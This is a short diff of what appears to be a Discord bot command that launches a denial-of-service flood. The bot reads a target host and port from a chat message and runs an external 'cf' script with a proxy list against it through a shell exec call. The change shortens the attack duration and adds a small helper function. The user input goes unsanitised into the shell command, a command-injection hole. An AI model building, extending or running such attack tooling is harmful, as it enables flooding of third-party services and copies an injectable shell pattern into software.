@@ -7,6 +7,10 @@ function Warn(msg) {
   return embed;
 }
 
+function isLetter(c) {
+  return c.toLowerCase() != c.toUpperCase();
+}
+
 exports.run = async (client, message, args) => {
 
 const host = message.content.split (" ")[1]
@@ -50,7 +54,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`node cf ${host} ${port} 1500 GET proxy.txt ${reqip}`, (error, stdout, stderr) => {
+exec(`node cf ${host} ${port} 300 GET proxy.txt ${reqip}`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
